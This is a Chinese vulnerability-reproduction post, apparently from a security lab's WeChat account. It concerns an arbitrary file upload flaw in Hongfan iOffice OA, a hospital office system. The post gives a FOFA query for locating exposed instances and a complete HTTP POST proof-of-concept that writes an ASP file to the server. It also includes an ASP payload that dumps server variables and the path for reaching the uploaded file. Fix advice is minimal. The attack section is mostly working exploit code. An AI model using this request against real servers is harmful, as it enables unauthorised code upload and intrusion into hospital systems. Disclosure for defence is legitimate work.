#  【漏洞复现】红帆OA iorepsavexml 任意文件上传漏洞   
原创 ZJyang  蚁剑安全实验室   2023-12-19 22:47  
  
**免责声明：该文章仅用于技术讨论与学习。请勿利用文章所提供的相关技术从事非法测试，若利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果均与文章作者及本账号无关。**  
  
**漏洞名称**  
  
红帆  
OA iorepsavexml 任意文件上传漏洞  
  
**漏洞详情**  
  
红帆  
oa系统为医院提供  
oA功能  
,完成信息发布、流程审批、公文管理、日程管理、工作安排、文件传递、在线沟通等行政办公业务。红帆  
OA iorepsavexml 接口存在任意文件上传漏洞，成功利用此漏洞可上传恶意文件至服务器。  
  
**影响产品**  
  
红帆  
OA  
  
**漏洞复现**  
  
fofa  
：  
app="红帆  
-ioffice"  
  
1.  
系统登录页面：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OIzfYbpicRTQ5elL8WmyVNdBe97a9OcRZxp7t4h2xmlwTk1JaUYrBbHaZeYIpib6FwXeRj6l5u4k2ibmcs7vgVX3A/640?wx_fmt=png&from=appmsg "")  
  
2.  
漏洞路径  
  
Poc:****  
```
POST /iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=zzz.asp&filepath=/upfiles/rep/pic/ HTTP/1.1
Host: 
Upgrade-Insecure-Requests:
1
User-Agent: Mozilla/5.0
(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0
Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language:zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
<%
Response.Write("<h1>服务器环境配置信息</h1>")
Response.Write("<h2>操作系统：</h2>")
Response.Write(Server.HTMLEncode(Request.ServerVariables("OS")))
Response.Write("<h2>ASP版本：</h2>")
Response.Write(Server.HTMLEncode(Request.ServerVariables("SERVER_SOFTWARE")))
Response.Write("<h2>.NET版本：</h2>")
Response.Write(Server.HTMLEncode(Request.ServerVariables("ASPNET_VERSION")))
Response.Write("<h2>当前时间：</h2>")
Response.Write(Server.HTMLEncode(Now()))
Response.Write("<h2>其他环境变量：</h2>")
For Each var In
Request.ServerVariables
  
Response.Write("<p>" & Server.HTMLEncode(var)
& ": " & Server.HTMLEncode(Request.ServerVariables(var))
& "</p>")
Next
%>
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OIzfYbpicRTQ5elL8WmyVNdBe97a9OcRZqs8jbMQRoXWOlSvquT2AMS77hAx3ftcvT2H1AoBkny9ILeQwj7JeOA/640?wx_fmt=png&from=appmsg "")  
  
3  
、访问上传文件，路径  
/iOffice/upfiles/rep/pic/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OIzfYbpicRTQ5elL8WmyVNdBe97a9OcRZYiakkyAt6zicGIpuvmp8kMChKxgD9guzIS61aYbRR3602icmYK2cib5iciaA/640?wx_fmt=png&from=appmsg "")  
  
**修复建议**  
  
**补丁文件**  
  
暂无  
  
**其他修复方法**  
  
更新当前系统至最新版****  
  
**缓解方案**  
  
无  
  
